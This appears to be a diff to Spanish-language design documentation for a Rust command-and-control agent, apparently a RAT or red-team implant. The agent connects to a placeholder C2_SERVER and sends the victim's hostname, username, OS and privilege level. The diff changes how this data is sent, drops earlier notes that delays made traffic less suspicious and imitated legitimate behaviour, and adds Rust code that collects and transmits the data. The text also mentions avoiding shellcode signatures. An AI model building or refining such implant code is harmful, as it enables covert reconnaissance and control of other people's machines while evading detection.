@@ -253,11 +253,11 @@ Agent: (TCP connect to C2_SERVER)
 #### 2. Envío de Información del Sistema
 ```
 Agent → Server: __SYSINFO__:hostname:DESKTOP-ABC123\n
-Agent → Server: __SYSINFO__:username:john\n
-Agent → Server: __SYSINFO__:os:Windows 10 Pro\n
-Agent → Server: __SYSINFO__:privileges:Admin\n
+                __SYSINFO__:username:john\n
+                __SYSINFO__:os:Windows 10 Pro\n
+                __SYSINFO__:privileges:Admin\n
 ```
-*Nota: Con delays de 10s entre cada mensaje*
+*Nota: Enviado todo de una vez al conectarse (sin delays)*
 
 #### 3. Keep-Alive
 ```
@@ -295,15 +295,22 @@ loop {
 - Si pierde conexión, reintenta cada 10s
 - No muere si el servidor cae
 
-#### 2. **Envío Gradual de Información**
+#### 2. **Envío Completo de Información al Conectar**
 ```rust
-for info_type in &["hostname", "username", "os", "privileges"] {
-    // ... enviar info ...
-    thread::sleep(Duration::from_secs(10)); // 🐌 Lento = menos sospechoso
+fn send_sysinfo(writer: &mut TcpStream) {
+    // Recopilar toda la información de una vez
+    let hostname = get_system_info("hostname");
+    let username = get_system_info("username");
+    let os = get_system_info("os");
+    let privileges = get_system_info("privileges");
+    
+    // Enviar todo en un solo mensaje
+    let sysinfo = format!("__SYSINFO__:hostname:{}\n...", hostname);
+    writer.write_all(sysinfo.as_bytes()).ok();
 }
 ```
-- Evita ráfagas de actividad
-- Simula comportamiento legítimo
+- Información completa desde el primer contacto
+- No se mezcla con pings o comandos
 
 #### 3. **No hay Firmas de Shellcode**
 - Sin `0x4D 0x5A` (MZ header de PE)
